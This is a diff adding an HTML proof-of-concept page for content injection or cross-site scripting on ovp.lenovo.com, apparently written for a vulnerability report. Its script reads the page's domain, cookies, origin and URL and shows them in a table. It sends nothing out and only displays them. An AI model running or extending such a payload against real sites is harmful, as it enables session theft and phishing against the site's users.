@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>OVP PoC</title>
+</head>
+<body>
+<div id="poc" style="font-family:sans-serif;max-width:600px;margin:40px auto;padding:20px;border:3px solid #c00;border-radius:8px;background:#fff8f8">
+<h1 style="color:#c00;margin-top:0">Content Injection PoC</h1>
+<p>This content is loaded from an <b>attacker-controlled domain</b> but renders inside <code>ovp.lenovo.com</code>.</p>
+<table style="width:100%;border-collapse:collapse;margin:16px 0">
+<tr><td style="padding:8px;border:1px solid #ddd;font-weight:bold">document.domain</td><td id="d" style="padding:8px;border:1px solid #ddd"></td></tr>
+<tr><td style="padding:8px;border:1px solid #ddd;font-weight:bold">document.cookie</td><td id="c" style="padding:8px;border:1px solid #ddd"></td></tr>
+<tr><td style="padding:8px;border:1px solid #ddd;font-weight:bold">window.origin</td><td id="o" style="padding:8px;border:1px solid #ddd"></td></tr>
+<tr><td style="padding:8px;border:1px solid #ddd;font-weight:bold">location.href</td><td id="l" style="padding:8px;border:1px solid #ddd;word-break:break-all"></td></tr>
+</table>
+<p style="color:#666;font-size:13px">If <code>document.domain</code> shows <code>ovp.lenovo.com</code>, this is same-origin XSS.<br>
+If it shows the attacker domain, this is still content injection / phishing on the Lenovo domain.</p>
+</div>
+<script>
+document.getElementById('d').textContent = document.domain || '(empty)';
+document.getElementById('c').textContent = document.cookie || '(empty or HttpOnly)';
+document.getElementById('o').textContent = window.origin || '(empty)';
+document.getElementById('l').textContent = location.href;
+</script>
+</body>
+</html>
